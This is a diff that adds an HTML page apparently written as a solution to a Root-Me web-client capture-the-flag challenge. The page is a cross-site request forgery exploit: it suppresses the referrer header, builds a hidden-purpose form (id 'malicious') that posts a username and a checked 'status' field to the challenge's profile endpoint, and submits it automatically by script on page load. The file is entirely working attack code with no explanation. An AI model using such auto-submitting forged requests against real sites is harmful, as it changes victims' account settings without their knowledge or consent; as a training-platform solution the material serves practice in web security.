@@ -1,1 +1,27 @@
-test
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="referrer" content="never">
+    <meta name="referrer" content="no-referrer">
+</head>
+<body>
+    <form id="malicious" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">
+		<div class="form-group">
+		<label>Username:</label>
+		<input type="text" name="username" value="fou">
+		</div>
+		<br>		
+		<div class="form-group">
+		<label>Status:</label>
+		<input type="checkbox" name="status" checked>
+		</div>
+		<br>	
+		<button type="submit">Submit</button>
+		</form>
+    
+     <script>
+        document.getElementById('malicious').submit();
+     </script>
+</body>
+</html>
